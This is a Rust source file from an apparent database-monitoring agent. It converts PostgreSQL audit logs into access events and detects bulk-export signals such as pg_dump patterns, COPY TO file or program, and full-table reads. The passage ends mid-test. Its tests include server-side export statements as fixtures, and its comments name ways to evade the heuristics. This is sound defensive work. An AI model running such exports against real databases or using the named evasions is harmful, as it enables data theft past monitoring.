//! From pgaudit records and `pg_stat_statements` deltas to masked access
//! events (ADR-0007): who, which objects (normalized names), which action,
//! how many rows, and the signals computed here from the raw text, which
//! never leaves the agent.
//!
//! Signal heuristics (the vocabulary is `classifiers::masking::Signal`):
//! - `signature.pg_dump`: `application_name` is `pg_dump` / `pg_dumpall`
//!   (spoofable, cheap), or one session (one role within one
//!   `pg_stat_statements` poll) copied at least [`DUMP_MIN_RELATIONS`]
//!   distinct whole relations to the client (`COPY … TO STDOUT`), which is
//!   what `pg_dump` does whatever its `application_name`.
//! - `signature.copy_to_file` / `signature.copy_to_program`: `COPY … TO
//!   '<file>'` / `COPY … TO PROGRAM` (server-side export).
//! - `shape.full_table_copy`: `COPY` out of a whole relation, or of a query
//!   without filter, aggregation or small limit.
//! - `shape.full_table_read`: a read (`SELECT`, `TABLE`) without top-level
//!   `WHERE`, `GROUP BY` / aggregate-only list, derived table, and without
//!   a limit or with a limit above [`LARGE_LIMIT`] rows.
//! - `volume.large_result`: more than [`LARGE_ROWS`] rows returned or
//!   affected (one statement with `pgaudit.log_rows`, or one counter
//!   delta).
//!
//! `shape.*` are heuristics and evadable by design (`WHERE true`,
//! `LIMIT 10000` pages); volume × sensitivity in the console is the robust
//! signal.
//!
//! Each pgaudit record is analyzed on its own statement text, and only the
//! statements matching its command tag count (`select 1; copy … to
//! program …` logs two records). A read or write whose objects cannot be
//! told (function bodies, unparsable text) is reported against `*`, never
//! dropped; statements naming only catalogs (`pg_catalog`,
//! `information_schema`, `pg_toast`, unqualified `pg_*`,
//! `pg_stat_statements*`) are skipped. Events of the agent's own account
//! are left out only when they come from its `application_name` and client
//! address, carry no signal, and either are one of the connector's own
//! statements that read no relation (exact text with pgaudit, normalized
//! shape with `pg_stat_statements`; not charged) or stay within
//! Discovery's row budget per named object and window (`OwnAccount`). Any
//! other event of the agent's account on `*` is reported.

use std::collections::{HashMap, HashSet, VecDeque};
use std::time::{Instant, SystemTime};

use databastion_classifiers::masking::{
    ClientAddr, EventAction, EventObject, EventPrincipal, EventSource, MaskedEvent, Signal,
};
use databastion_classifiers::names::NormalizedName;
use databastion_classifiers::query::{
    AnalyzeOptions, CopyEndpoint, NormalizedQuery, QueryAnalysis, RelationName, StatementInfo,
    StatementKind, analyze,
};

use super::records::AuditRecord;
use crate::conn::APPLICATION_NAME;
use crate::discover::normalize;
use crate::sql;

/// A limit above this many rows reads a whole relation.
pub(crate) const LARGE_LIMIT: u64 = 10_000;
/// Rows above which `volume.large_result` is set. Both thresholds sit just
/// above the agent's own maximum sample (`limits.max_sample_rows` is at
/// most 10 000), so its Discovery statements never carry these signals.
pub(crate) const LARGE_ROWS: u64 = 10_000;
/// Whole relations copied to the client by one session before
/// `signature.pg_dump` is set.
pub(crate) const DUMP_MIN_RELATIONS: usize = 3;
/// Sessions followed for the `pg_dump` pattern (oldest forgotten first).
const MAX_SESSIONS: usize = 4096;
/// Relations remembered per session.
const MAX_SESSION_RELATIONS: usize = 64;

fn analyze_opts(truncated: bool) -> AnalyzeOptions {
    let mut o = AnalyzeOptions::new().truncated(truncated);
    o.large_limit = LARGE_LIMIT + 1;
    o
}

fn is_catalog(r: &RelationName) -> bool {
    // The agent's own probes read `pg_stat_statements*` in the extension's
    // schema: statistics, not application data.
    if r.name.starts_with("pg_stat_statements") {
        return true;
    }
    match r.schema.as_deref() {
        Some("pg_catalog" | "information_schema" | "pg_toast") => true,
        Some(s) => s.starts_with("pg_temp_") || s.starts_with("pg_toast_temp_"),
        None => r.name.starts_with("pg_"),
    }
}

/// Splits a pgaudit object name (`schema.table`, parts possibly quoted).
fn split_object_name(raw: &str) -> Option<RelationName> {
    let mut parts: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut quoted = false;
    let mut chars = raw.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '"' if quoted && chars.peek() == Some(&'"') => {
                chars.next();
                cur.push('"');
            }
            '"' => quoted = !quoted,
            '.' if !quoted => parts.push(std::mem::take(&mut cur)),
            _ => cur.push(c),
        }
    }
    if quoted {
        return None;
    }
    parts.push(cur);
    if parts.iter().any(String::is_empty) || parts.len() > 3 {
        return None;
    }
    let name = parts.pop()?;
    Some(RelationName {
        schema: parts.pop(),
        name,
    })
}

fn object(database: &str, r: &RelationName) -> EventObject {
    EventObject::new(
        normalize(database),
        r.schema.as_deref().map(normalize),
        normalize(&r.name),
    )
}

/// An object the source does not name: the database, and `*`.
fn unknown_object(database: &str) -> EventObject {
    EventObject::new(normalize(database), None, NormalizedName::wildcard())
}

/// pgaudit object types that hold rows.
fn is_relation_type(t: &str) -> bool {
    matches!(
        t,
        "TABLE" | "VIEW" | "MATERIALIZED VIEW" | "FOREIGN TABLE" | "PARTITIONED TABLE"
    )
}

fn is_dump_application(app: &str) -> bool {
    matches!(app.trim(), "pg_dump" | "pg_dumpall")
}

/// Statement kinds a pgaudit command tag can stand for.
fn kinds_of(command: &str) -> &'static [StatementKind] {
    match command {
        "SELECT" => &[
            StatementKind::Select,
            StatementKind::Table,
            StatementKind::Values,
        ],
        "COPY" => &[StatementKind::Copy],
        "INSERT" => &[StatementKind::Insert],
        "UPDATE" => &[StatementKind::Update],
        "DELETE" => &[StatementKind::Delete],
        "MERGE" => &[StatementKind::Merge],
        _ => &[],
    }
}

/// The statements of `a` a record with `command` is about: those of the
/// matching kind (a `DO` body included); every statement when none
/// matches (the text does not settle it).
fn matching<'a>(a: &'a QueryAnalysis, command: Option<&str>) -> Vec<&'a StatementInfo> {
    let kinds = command.map_or(&[][..], kinds_of);
    let m: Vec<&StatementInfo> = a
        .parts()
        .iter()
        .filter(|p| kinds.contains(&p.kind))
        .collect();
    if m.is_empty() {
        a.parts().iter().collect()
    } else {
        m
    }
}

/// Relations named by `parts`, catalogs excluded; the flag says whether
/// any relation (catalogs included) was named.
fn user_relations(parts: &[&StatementInfo]) -> (Vec<RelationName>, bool) {
    let mut out = Vec::new();
    let mut any = false;
    for p in parts {
        for r in &p.relations {
            any = true;
            if !is_catalog(r) && !out.contains(r) {
                out.push(r.clone());
            }
        }
    }
    (out, any)
}

/// Signals of statements from their analysis (not the session pattern).
fn statement_signals(parts: &[&StatementInfo], rows: Option<u64>) -> Vec<Signal> {
    let mut out = Vec::new();
    for p in parts {
        if let Some(c) = p.copy {
            if c.to {
                match c.endpoint {
                    CopyEndpoint::File => out.push(Signal::CopyToFile),
                    CopyEndpoint::Program => out.push(Signal::CopyToProgram),
                    CopyEndpoint::Client | CopyEndpoint::Unknown => {}
                }
                if c.whole_relation {
                    out.push(Signal::FullTableCopy);
                }
            }
        }
        if p.kind.is_read()
            && p.relations.iter().any(|r| !is_catalog(r))
            && p.shape.is_some_and(|s| s.whole_relation(LARGE_LIMIT + 1))
        {
            out.push(Signal::FullTableRead);
        }
    }
    if rows.is_some_and(|r| r > LARGE_ROWS) {
        out.push(Signal::LargeResult);
    }
    out
}

/// Relations a statement copies whole to the client.
fn copied_to_client(parts: &[&StatementInfo]) -> Vec<RelationName> {
    let mut out = Vec::new();
    for p in parts {
        if p.copy
            .is_some_and(|c| c.to && c.whole_relation && c.endpoint == CopyEndpoint::Client)
        {
            out.extend(p.relations.iter().filter(|r| !is_catalog(r)).cloned());
        }
    }
    out
}

/// Sessions seen copying whole relations to the client.
#[derive(Default)]
pub(crate) struct DumpTracker {
    sessions: HashMap<String, HashSet<RelationName>>,
    order: VecDeque<String>,
}

impl DumpTracker {
    /// Records the relations a statement of `session` copied whole to the
    /// client; `true` once the session reached [`DUMP_MIN_RELATIONS`].
    pub(crate) fn copied(&mut self, session: &str, relations: &[RelationName]) -> bool {
        if !self.sessions.contains_key(session) {
            if self.sessions.len() >= MAX_SESSIONS {
                if let Some(old) = self.order.pop_front() {
                    self.sessions.remove(&old);
                }
            }
            self.order.push_back(session.to_owned());
            self.sessions.insert(session.to_owned(), HashSet::new());
        }
        let Some(set) = self.sessions.get_mut(session) else {
            return false;
        };
        for r in relations {
            if set.len() < MAX_SESSION_RELATIONS {
                set.insert(r.clone());
            }
        }
        set.len() >= DUMP_MIN_RELATIONS
    }
}

/// Period over which the agent's own reads of one object are budgeted.
const OWN_PERIOD_HOURS: u64 = 24;
/// Objects budgeted at most; beyond, the agent's own reads of a new
/// object are reported.
const OWN_MAX_OBJECTS: usize = 10_000;

/// Where the client address of an event comes from.
#[derive(Debug, Clone, Copy)]
pub(crate) enum ClientSeen {
    /// The source logs it (pgaudit); `None`: not logged.
    Logged(Option<ClientAddr>),
    /// The source never shows it (`pg_stat_statements`).
    NotVisible,
}

/// Most statements registered at run time ([`OwnAccount::allow_statement`]).
const OWN_MAX_EXTRA_STATEMENTS: usize = 8;

/// Rows the agent's own account read per object, per hour, over the
/// last 24 hours. Kept per target by the connector (`CheckState`), so it
/// outlives streams: a restarted stream (failure, source switch, the
/// agent's sessions terminated on purpose) does not get a fresh budget.
/// Not persisted: an agent restart resets it.
///
/// Also keeps the table-less statements registered at run time (the
/// `pg_stat_statements` text query, whose schema is only known then), so
/// that a pgaudit stream started after a `pg_stat_statements` period
/// recognizes them in the records of that period.
pub(crate) struct OwnUsage {
    start: Instant,
    usage: HashMap<String, VecDeque<(u64, u64)>>,
    statements: Vec<String>,
}

impl Default for OwnUsage {
    fn default() -> Self {
        Self {
            start: Instant::now(),
            usage: HashMap::new(),
            statements: Vec::new(),
        }
    }
}

/// Shared handle on a target's [`OwnUsage`].
pub(crate) type SharedOwnUsage = std::sync::Arc<std::sync::Mutex<OwnUsage>>;

/// What an event of the agent's account is about, for [`OwnAccount`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum OwnKind {
    /// One of the connector's own statements that read no relation.
    Tableless,
    /// A read or write whose objects the source does not tell (`*`).
    Unknown,
    /// Named relations.
    Named,
}

/// Normalized text of a statement with `true` / `false` read as
/// placeholders (`pg_stat_statements` replaces boolean constants too).
fn statement_shape(n: &NormalizedQuery) -> String {
    n.as_str()
        .split(' ')
        .map(|t| {
            if matches!(t, "true" | "false") {
                "?"
            } else {
                t
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

/// The agent's own activity, which may be left out of the events.
pub(crate) struct OwnAccount {
    account: String,
    /// Client address the server sees for the agent (`None`: could not be
    /// read; then nothing is left out).
    addr: Option<ClientAddr>,
    /// Rows per object over [`OWN_PERIOD_HOURS`] above which the agent's
    /// own reads are reported anyway (`limits.max_sample_rows`: one
    /// Discovery scan never reads more per object).
    budget: u64,
    /// Per object: rows per hour (hour index, rows), last 24 hours.
    usage: SharedOwnUsage,
    /// The connector's own statements that name no relation (closed
    /// list: `sql::OWN_TABLELESS`, and the `pg_stat_statements` text
    /// query of this stream), as sent (pgaudit logs the text verbatim)
    /// and as normalized shapes (`pg_stat_statements` replaces the
    /// constants).
    own_texts: Vec<String>,
    own_shapes: Vec<String>,
}

impl OwnAccount {
    pub(crate) fn new(
        account: &str,
        addr: Option<ClientAddr>,
        budget: u64,
        usage: SharedOwnUsage,
    ) -> Self {
        let extra = usage
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .statements
            .clone();
        let mut own = Self {
            account: account.to_owned(),
            addr,
            budget,
            usage,
            own_texts: Vec::new(),
            own_shapes: Vec::new(),
        };
        for text in sql::OWN_TABLELESS {
            own.add_statement(text);
        }
        for text in &extra {
            own.add_statement(text);
        }
        own
    }

    fn add_statement(&mut self, text: &str) {
        if self.own_texts.iter().any(|t| t == text) {
            return;
        }
        self.own_texts.push(text.to_owned());
        if let Some(n) = analyze(text, analyze_opts(false)).normalized() {
            self.own_shapes.push(statement_shape(n));
        }
    }

    /// Adds a statement the connector sends that names no relation, and
    /// keeps it for the target's later streams (at most
    /// [`OWN_MAX_EXTRA_STATEMENTS`]; beyond, this stream only).
    pub(crate) fn allow_statement(&mut self, text: &str) {
        self.add_statement(text);
        let mut guard = self
            .usage
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        if !guard.statements.iter().any(|t| t == text)
            && guard.statements.len() < OWN_MAX_EXTRA_STATEMENTS
        {
            guard.statements.push(text.to_owned());
        }
    }

    /// `text` is exactly one of the connector's own table-less statements.
    fn own_text(&self, text: &str) -> bool {
        self.own_texts.iter().any(|t| t == text)
    }

    /// The normalized shape of `a` is one of the connector's own
    /// table-less statements (no normalized text, e.g. a cut text: no).
    fn own_shape(&self, a: &QueryAnalysis) -> bool {
        a.normalized()
            .is_some_and(|n| self.own_shapes.contains(&statement_shape(n)))
    }

    /// Charges `rows` to an object; `true` when its 24 h total exceeds the
    /// budget (or it cannot be tracked).
    fn charge(&mut self, key: String, rows: u64, now: Instant) -> bool {
        let mut guard = self
            .usage
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let hour = now.saturating_duration_since(guard.start).as_secs() / 3600;
        let usage = &mut guard.usage;
        if !usage.contains_key(&key) && usage.len() >= OWN_MAX_OBJECTS {
            // Drop objects with no use in the period, then fail open to
            // reporting.
            usage.retain(|_, v| {
                v.back()
                    .is_some_and(|(h, _)| hour.saturating_sub(*h) < OWN_PERIOD_HOURS)
            });
            if usage.len() >= OWN_MAX_OBJECTS {
                return true;
            }
        }
        let buckets = usage.entry(key).or_default();
        while buckets
            .front()
            .is_some_and(|(h, _)| hour.saturating_sub(*h) >= OWN_PERIOD_HOURS)
        {
            buckets.pop_front();
        }
        match buckets.back_mut() {
            Some((h, n)) if *h == hour => *n = n.saturating_add(rows),
            _ => buckets.push_back((hour, rows)),
        }
        let total = buckets
            .iter()
            .fold(0u64, |acc, (_, n)| acc.saturating_add(*n));
        total > self.budget
    }

    /// Whether an event may be left out: the agent's account, its
    /// `application_name` (pgaudit), its own client address (pgaudit; the
    /// agent's address must be known), no signal, and at most `budget`
    /// rows per object over 24 hours (unknown rows are charged the whole
    /// budget). With stolen agent credentials, reads from elsewhere, reads
    /// that look like exports, and reading more of a table than one
    /// Discovery scan per day are still reported.
    ///
    /// [`OwnKind::Tableless`]: the event is one of the connector's own
    /// statements that read no relation ([`sql::OWN_TABLELESS`]: the
    /// per-transaction `set_config`, `current_setting`,
    /// `inet_client_addr`; the `pg_stat_statements` text query). Such an
    /// event is left out on the same identity and signal rules, without
    /// being charged: it reads no row, and charging it would use up the
    /// `*` budget within one scan. Any other table-less statement of the
    /// account ([`OwnKind::Unknown`]: a function call, even in
    /// `pg_catalog`, e.g. `query_to_xml`; a text that does not parse) is
    /// reported: events on the unknown object `*` are never left out.
    fn routine(
        &mut self,
        user: &str,
        application: Option<&str>,
        client: ClientSeen,
        e: &MaskedEvent,
        kind: OwnKind,
        now: Instant,
    ) -> bool {
        if user != self.account {
            return false;
        }
        let addr_ok = match (self.addr, client) {
            (None, _) => false,
            (Some(own), ClientSeen::Logged(Some(c))) => own == c,
            (Some(_), ClientSeen::Logged(None)) => false,
            (Some(_), ClientSeen::NotVisible) => true,
        };
        let identity = application.is_none_or(|a| a == APPLICATION_NAME) && addr_ok;
        match kind {
            OwnKind::Tableless => return identity && e.signals().is_empty(),
            // The connector names every relation it reads, and its only
            // table-less statements are the ones above: an event of the
            // account on the unknown object is not the agent's own
            // traffic. Reported, never budgeted: the unknown object is
            // never charged, so no traffic can exhaust its budget.
            OwnKind::Unknown => return false,
            OwnKind::Named => {}
        }
        let rows = e.rows().unwrap_or(self.budget);
        let mut over = false;
        for o in e.objects() {
            let key = format!(
                "{}\u{0}{}\u{0}{}",
                o.database().as_str(),
                o.schema().map_or("", |s| s.as_str()),
                o.object().as_str()
            );
            over |= self.charge(key, rows, now);
        }
        identity && e.signals().is_empty() && !over
    }
}

/// Builds events from pgaudit records.
pub(crate) struct PgauditEvents {
    own: OwnAccount,
    dumps: DumpTracker,
}

/// Per class of a statement: objects, rows, signals, unknown objects.
#[derive(Default)]
struct ClassPart {
    objects: Vec<RelationName>,
    rows: Option<u64>,
    signals: Vec<Signal>,
    unknown: bool,
    catalog_only: bool,
    dump: bool,
    /// A record of this class has a text other than one of the
    /// connector's own table-less statements.
    not_own_text: bool,
}

impl PgauditEvents {
    pub(crate) fn new(own: OwnAccount) -> Self {
        Self {
            own,
            dumps: DumpTracker::default(),
        }
    }

    /// Converts records (in log order) to events: one statement (same
    /// session and statement id, `SESSION` and `OBJECT` records merged)
    /// gives one event per action class (`read`, `write`, `ddl`, `dcl`).
    pub(crate) fn convert(
        &mut self,
        records: Vec<AuditRecord>,
        now: SystemTime,
    ) -> Vec<MaskedEvent> {
        let mut out = Vec::new();
        let mut group: Vec<AuditRecord> = Vec::new();
        for r in records {
            let same = group.first().is_some_and(|g| {
                g.session == r.session && g.audit.statement_id == r.audit.statement_id
            });
            if !same && !group.is_empty() {
                self.flush(std::mem::take(&mut group), now, &mut out);
            }
            group.push(r);
        }
        if !group.is_empty() {
            self.flush(group, now, &mut out);
        }
        out
    }

    fn flush(&mut self, group: Vec<AuditRecord>, now: SystemTime, out: &mut Vec<MaskedEvent>) {
        let Some(first) = group.first() else {
            return;
        };
        let mut parts: HashMap<EventAction, ClassPart> = HashMap::new();
        let mut seen_subs: HashSet<(u64, String, String)> = HashSet::new();
        // Each record is analyzed on its own text (a substatement of a
        // function or DO block logs its own text); consecutive records
        // with the same text reuse the analysis.
        let mut cached: Option<(&str, QueryAnalysis)> = None;
        for r in &group {
            let action = match r.audit.class.as_str() {
                "READ" => EventAction::Read,
                "WRITE" => EventAction::Write,
                "DDL" => EventAction::Ddl,
                "ROLE" => EventAction::Dcl,
                _ => continue,
            };
            // SESSION and OBJECT records of the same substatement and
            // object are one access.
            if !seen_subs.insert((
                r.audit.substatement_id,
                r.audit.object_name.to_string(),
                r.audit.class.clone(),
            )) {
                continue;
            }
            let text: &str = &r.audit.statement;
            if cached.as_ref().is_none_or(|(t, _)| *t != text) {
                cached = Some((text, analyze(text, analyze_opts(false))));
            }
            let Some((_, analysis)) = cached.as_ref() else {
                continue;
            };
            let stmts = matching(analysis, Some(r.audit.command.as_str()));
            let (text_relations, named_any) = user_relations(&stmts);
            let own_text = self.own.own_text(text);
            let part = parts.entry(action).or_default();
            part.not_own_text |= !own_text;
            let mut named = false;
            if !r.audit.object_name.is_empty() && is_relation_type(&r.audit.object_type) {
                if let Some(rel) = split_object_name(&r.audit.object_name) {
                    named = true;
                    if is_catalog(&rel) {
                        // A named catalog relation (`pgaudit.log_catalog`,
                        // `pg_stat_statements_info`): not application
                        // data, and not an unknown object either.
                        part.catalog_only = true;
                    } else if !part.objects.contains(&rel) {
                        part.objects.push(rel);
                    }
                }
            }
            if !named {
                if text_relations.is_empty() {
                    if named_any {
                        part.catalog_only = true;
                    } else {
                        part.unknown = true;
                    }
                }
                for rel in text_relations {
                    if !part.objects.contains(&rel) {
                        part.objects.push(rel);
                    }
                }
            }
            // A utility COPY record logs 0 rows: unknown.
            let utility_copy = r.audit.command == "COPY" && r.audit.object_name.is_empty();
            if let (Some(rows), false) = (r.audit.rows, utility_copy) {
                part.rows = Some(part.rows.map_or(rows, |p| p.max(rows)));
            }
            if action == EventAction::Read {
                part.signals.extend(statement_signals(&stmts, None));
                // PL/pgSQL cannot COPY to the client: a COPY record whose
                // text does not show the COPY (dynamic SQL, nested DO) is
                // a server-side export.
                if r.audit.command == "COPY"
                    && analysis.kind() != StatementKind::Copy
                    && !stmts.iter().any(|p| p.kind == StatementKind::Copy)
                {
                    part.signals.push(Signal::CopyToFile);
                }
                let copied = copied_to_client(&stmts);
                if !copied.is_empty() && self.dumps.copied(&r.session, &copied) {
                    part.dump = true;
                }
            }
        }
        if parts.is_empty() {
            return;
        }
        let principal = EventPrincipal::account(&first.user)
            .with_client(first.remote.as_deref().and_then(ClientAddr::parse))
            .with_application(&first.application);
        let ts = first.ts.unwrap_or(now);
        let mut actions: Vec<EventAction> = parts.keys().copied().collect();
        actions.sort();
        for action in actions {
            let Some(part) = parts.remove(&action) else {
                continue;
            };
            let rw = matches!(action, EventAction::Read | EventAction::Write);
            if rw && part.objects.is_empty() && part.catalog_only && !part.unknown {
                // Only catalogs: not application data.
                continue;
            }
            let mut e = MaskedEvent::new(EventSource::Pgaudit, action, principal.clone(), ts)
                .with_rows(part.rows);
            for o in part.objects.iter().take(16) {
                e = e.with_object(object(&first.database, o));
            }
            let unknown = rw && (part.objects.is_empty() || part.unknown);
            if unknown {
                // A read or write whose objects the log does not tell (a
                // function or procedure body, a statement that does not
                // parse): reported against `*` rather than dropped (the
                // contract needs one object for read / write).
                e = e.with_object(unknown_object(&first.database));
            }
            for s in part.signals {
                e = e.with_signal(s);
            }
            if part.rows.is_some_and(|r| r > LARGE_ROWS) {
                e = e.with_signal(Signal::LargeResult);
            }
            if action == EventAction::Read
                && (part.dump
                    || (is_dump_application(&first.application)
                        && (e.signals().contains(&Signal::FullTableCopy)
                            || e.signals().contains(&Signal::FullTableRead))))
            {
                e = e.with_signal(Signal::PgDump);
            }
            let client = first.remote.as_deref().and_then(ClientAddr::parse);
            let kind = if !part.not_own_text && part.objects.is_empty() {
                OwnKind::Tableless
            } else if unknown {
                OwnKind::Unknown
            } else {
                OwnKind::Named
            };
            if self.own.routine(
                &first.user,
                Some(&first.application),
                ClientSeen::Logged(client),
                &e,
                kind,
                Instant::now(),
            ) {
                continue;
            }
            out.push(e);
        }
    }
}

/// One `pg_stat_statements` counter delta.
pub(crate) struct StatementDelta<'a> {
    pub(crate) user: &'a str,
    pub(crate) database: &'a str,
    pub(crate) analysis: &'a QueryAnalysis,
    pub(crate) calls: u64,
    pub(crate) rows: u64,
}

/// Events from the `pg_stat_statements` deltas of one poll, between
/// `from` and `to`. `pg_stat_statements` gives no client address, no
/// application, no per-execution time and no per-execution row count: an
/// event is the sum over the poll interval of one statement for one role.
/// The agent's own account is reported only for deltas carrying a signal
/// (the application name is not visible here).
pub(crate) fn pss_events(
    deltas: &[StatementDelta<'_>],
    own: &mut OwnAccount,
    from: SystemTime,
    to: SystemTime,
) -> Vec<MaskedEvent> {
    // The pg_dump pattern per role within the poll.
    let mut copied: HashMap<&str, HashSet<RelationName>> = HashMap::new();
    for d in deltas {
        let all: Vec<&StatementInfo> = d.analysis.parts().iter().collect();
        let c = copied_to_client(&all);
        if !c.is_empty() {
            copied.entry(d.user).or_default().extend(c);
        }
    }
    let mut out = Vec::new();
    for d in deltas {
        let a = d.analysis;
        let all: Vec<&StatementInfo> = a.parts().iter().collect();
        let action = match a.kind() {
            StatementKind::Select | StatementKind::Table | StatementKind::Values => {
                EventAction::Read
            }
            StatementKind::Copy => {
                if a.copy().is_some_and(|c| c.to) {
                    EventAction::Read
                } else {
                    EventAction::Write
                }
            }
            StatementKind::Insert
            | StatementKind::Update
            | StatementKind::Delete
            | StatementKind::Merge => EventAction::Write,
            StatementKind::Ddl => EventAction::Ddl,
            StatementKind::Dcl => EventAction::Dcl,
            _ => continue,
        };
        let (objects, named_any) = user_relations(&all);
        let rw = matches!(action, EventAction::Read | EventAction::Write);
        if rw && objects.is_empty() && named_any {
            continue;
        }
        // COPY counts rows in pg_stat_statements too.
        let rows = Some(d.rows);
        let mut e = MaskedEvent::new(
            EventSource::PgStatStatements,
            action,
            EventPrincipal::account(d.user),
            from,
        )
        .with_rows(rows)
        .with_aggregate(d.calls, to);
        for o in &objects {
            e = e.with_object(object(d.database, o));
        }
        if rw && objects.is_empty() {
            e = e.with_object(unknown_object(d.database));
        }
        if action == EventAction::Read {
            for s in statement_signals(&all, rows) {
                e = e.with_signal(s);
            }
            if !copied_to_client(&all).is_empty()
                && copied
                    .get(d.user)
                    .is_some_and(|s| s.len() >= DUMP_MIN_RELATIONS)
            {
                e = e.with_signal(Signal::PgDump);
            }
        } else if d.rows > LARGE_ROWS {
            e = e.with_signal(Signal::LargeResult);
        }
        let kind = if objects.is_empty() && !named_any && own.own_shape(a) {
            OwnKind::Tableless
        } else if rw && objects.is_empty() {
            OwnKind::Unknown
        } else {
            OwnKind::Named
        };
        if own.routine(
            d.user,
            None,
            ClientSeen::NotVisible,
            &e,
            kind,
            Instant::now(),
        ) {
            continue;
        }
        out.push(e);
    }
    out
}

/// Analysis of a `pg_stat_statements` text (`truncated`: the text reached
/// the read bound).
pub(crate) fn analyze_pss(text: &str, truncated: bool) -> QueryAnalysis {
    analyze(text, analyze_opts(truncated))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::audit::records::{Format, parse_record};

    #[allow(clippy::too_many_arguments)]
    fn rec(
        session: &str,
        stmt: u64,
        sub: u64,
        class: &str,
        command: &str,
        object: &str,
        text: &str,
        rows: Option<u64>,
        app: &str,
    ) -> AuditRecord {
        let rows = rows.map_or(String::new(), |r| format!(",{r}"));
        let text = text.replace('"', "\"\"");
        let line = serde_json::json!({
            "timestamp": "2026-09-28 21:45:31.320 UTC", "user": user_of(app), "dbname": "shop",
            "error_severity": "LOG",
            "remote_host": "192.0.2.14", "session_id": session, "application_name": app,
            "message": format!("AUDIT: SESSION,{stmt},{sub},{class},{command},{},{object},\"{text}\",<not logged>{rows}",
                if object.is_empty() { "" } else { "TABLE" }),
        });
        parse_record(Format::Jsonlog, line.to_string().as_bytes(), "LOG").unwrap()
    }

    /// Records of the application `databastion-agent*` come from the
    /// agent's account `databastion`; others from `backup`.
    fn user_of(app: &str) -> &'static str {
        if app.starts_with("databastion-agent") || app == "stolen" {
            "databastion"
        } else {
            "backup"
        }
    }

    fn own() -> OwnAccount {
        OwnAccount::new(
            "databastion",
            ClientAddr::parse("192.0.2.14"),
            1000,
            SharedOwnUsage::default(),
        )
    }

    fn json(e: &MaskedEvent) -> String {
        format!(
            "{:?} {:?} {:?} {:?}",
            e.action(),
            e.objects()
                .iter()
                .map(|o| format!(
                    "{}.{}.{}",
                    o.database().as_str(),
                    o.schema().map_or("", |s| s.as_str()),
                    o.object().as_str()
                ))
                .collect::<Vec<_>>(),
            e.rows(),
            e.signals().iter().map(|s| s.as_str()).collect::<Vec<_>>()
        )
    }

    #[test]
    fn pg_dump_copies_raise_signature_and_shape() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            rec(
                "s1",
                1,
                1,
                "READ",
                "SELECT",
                "",
                "SELECT c.oid FROM pg_catalog.pg_class c",
                Some(1),
                "pg_dump",
            ),
            rec(
                "s1",
                2,
                1,
                "READ",
                "COPY",
                "",
                "COPY crm.customers (id, email) TO stdout;",
                Some(0),
                "pg_dump",
            ),
            rec(
                "s1",
                3,
                1,
                "READ",
                "COPY",
                "",
                "COPY billing.invoices (id) TO stdout;",
                Some(0),
                "pg_dump",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        assert_eq!(events.len(), 2, "catalog-only statement skipped");
        let e = json(&events[0]);
        assert!(e.contains("shop.crm.customers"), "{e}");
        assert!(
            e.contains("signature.pg_dump") && e.contains("shape.full_table_copy"),
            "{e}"
        );
        assert_eq!(events[0].rows(), None, "utility COPY rows are unknown");
        assert_eq!(events[0].principal().application(), Some("pg_dump"));
    }

    #[test]
    fn dump_pattern_without_the_application_name() {
        let mut b = PgauditEvents::new(own());
        let recs: Vec<_> = ["a", "b", "c", "d"]
            .iter()
            .enumerate()
            .map(|(i, t)| {
                rec(
                    "s2",
                    i as u64 + 1,
                    1,
                    "READ",
                    "COPY",
                    "",
                    &format!("copy crm.{t} to stdout"),
                    Some(0),
                    "psql",
                )
            })
            .collect();
        let events = b.convert(recs, SystemTime::now());
        let dump: Vec<bool> = events
            .iter()
            .map(|e| e.signals().contains(&Signal::PgDump))
            .collect();
        assert_eq!(dump, [false, false, true, true]);
    }

    #[test]
    fn session_and_object_records_merge_and_rows_are_kept() {
        let mut b = PgauditEvents::new(own());
        let text = "select * from crm.customers";
        let mut object = rec(
            "s3",
            1,
            1,
            "READ",
            "SELECT",
            "crm.customers",
            text,
            Some(20000),
            "psql",
        );
        object.audit.object_audit = true;
        let session = rec(
            "s3",
            1,
            1,
            "READ",
            "SELECT",
            "crm.customers",
            text,
            Some(20000),
            "psql",
        );
        let events = b.convert(vec![object, session], SystemTime::now());
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].rows(), Some(20000));
        let e = json(&events[0]);
        assert!(
            e.contains("shape.full_table_read") && e.contains("volume.large_result"),
            "{e}"
        );
        assert!(!e.contains("pg_dump"));
    }

    #[test]
    fn copy_to_file_and_program_and_filtered_reads() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            rec(
                "s4",
                1,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "copy (select id from crm.customers) to '/tmp/x.csv'",
                Some(150),
                "psql",
            ),
            rec(
                "s4",
                1,
                2,
                "READ",
                "COPY",
                "",
                "copy (select id from crm.customers) to '/tmp/x.csv'",
                Some(0),
                "psql",
            ),
            rec(
                "s4",
                2,
                1,
                "READ",
                "COPY",
                "",
                "copy crm.customers to program 'gzip'",
                Some(0),
                "psql",
            ),
            rec(
                "s4",
                3,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "select * from crm.customers where id = 42",
                Some(1),
                "psql",
            ),
            rec(
                "s4",
                4,
                1,
                "WRITE",
                "INSERT",
                "crm.notes",
                "insert into crm.notes select * from crm.customers",
                Some(3),
                "psql",
            ),
            rec(
                "s4",
                4,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "insert into crm.notes select * from crm.customers",
                Some(3),
                "psql",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(all.len(), 5, "{all:?}");
        assert!(
            all[0].contains("signature.copy_to_file") && all[0].contains("shape.full_table_copy"),
            "{}",
            all[0]
        );
        assert_eq!(events[0].rows(), Some(150));
        assert!(all[1].contains("signature.copy_to_program"), "{}", all[1]);
        assert!(!all[2].contains("shape."), "{}", all[2]);
        assert!(
            all[3].starts_with("Read") && all[3].contains("crm.customers"),
            "{}",
            all[3]
        );
        assert!(
